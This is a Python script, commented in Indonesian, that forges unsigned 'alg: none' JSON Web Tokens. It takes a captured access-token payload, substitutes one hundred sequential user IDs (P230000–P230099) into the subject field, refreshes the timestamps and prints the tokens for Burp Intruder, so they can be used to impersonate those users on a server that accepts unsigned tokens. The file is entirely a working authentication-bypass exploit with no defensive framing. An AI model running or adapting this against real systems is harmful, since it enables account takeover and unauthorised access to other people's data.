import json
import base64
import time

def base64url_encode(data):
    """ Meng-encode data ke format Base64 URL-safe tanpa padding. """
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

# --- TEMPELKAN PAYLOAD  ---
payload_template = {
  "fresh": False,
  "iat": 1763357687,
  "jti": "983e39d2-ed0c-48aa-b4cd-d4e2ea3e6666",
  "type": "access",
  "sub": "P230021",
  "nbf": 1763357687,
  "csrf": "3e01b511-3d7b-49c9-98fb-7fbe6b1ec007",
  "exp": 1763358587 
}
# ----------------------------------------------

# Header untuk "alg": "none"
header = {"alg": "none", "typ": "JWT"}
encoded_header = base64url_encode(json.dumps(header).encode('utf-8'))

print("Daftar Payload JWT (alg:none) BARU untuk Burp Intruder:")
print("-" * 50)

base_name = 230000

# Buat daftar payload untuk user P230000 s/d P230099
for i in range(100):
    # Buat username baru (INI YANG DIPERBAIKI)
    username = f"P{base_name + i}"
    
    # Buat salinan payload dan update field-nya
    new_payload_data = payload_template.copy()
    new_payload_data['sub'] = username
    
    # Perbarui timestamp agar token selalu valid
    now = int(time.time())
    new_payload_data['iat'] = now
    new_payload_data['nbf'] = now
    new_payload_data['exp'] = now + 3600  # Valid selama 1 jam
    
    # Encode payload
    json_payload = json.dumps(new_payload_data, separators=(',', ':'))
    encoded_payload = base64url_encode(json_payload.encode('utf-8'))
    
    # Buat token final (header.payload.)
    final_token = f"{encoded_header}.{encoded_payload}."
    
    # Cetak token untuk Burp
    print(final_token)

print("-" * 50)
print(f"Total {100} token dihasilkan.")